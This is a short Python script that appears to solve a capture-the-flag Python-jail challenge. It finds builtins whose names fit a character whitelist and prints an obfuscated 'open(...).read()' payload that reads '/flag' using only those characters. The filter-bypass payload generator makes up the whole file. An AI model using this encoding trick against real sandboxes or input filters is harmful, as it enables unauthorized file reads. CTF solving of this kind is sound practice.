import builtins

all_builtins = dir(builtins)
filtered_builtins = {name: getattr(builtins, name) for name in all_builtins if len(name) <= 4}
filtered_builtins.update({'print': print})

whitelist = "()+.<[]abcdehnoprs~"
for f in filtered_builtins:
    if all(c in whitelist for c in f):
        print(f)

# print(filtered_builtins)
neg_one = '~(()<())'

print([]<[[]])

path = b'/flag'
p = []
for c in path:
    cs = []
    for i in range(0, 8, 2):
        b = ''
        if (v := (c & (0b11 << i)) >> i):
            b += f'abs({"+".join([neg_one] * v)})'
            if i:
                b += '<<'
                b += f'abs({"+".join([neg_one] * i)})'
            cs.append(f'({b})')
    p.append("+".join(cs))


p = "+".join(f'chr({c})' for c in p)
p = f"open({p}).read()"
print(p)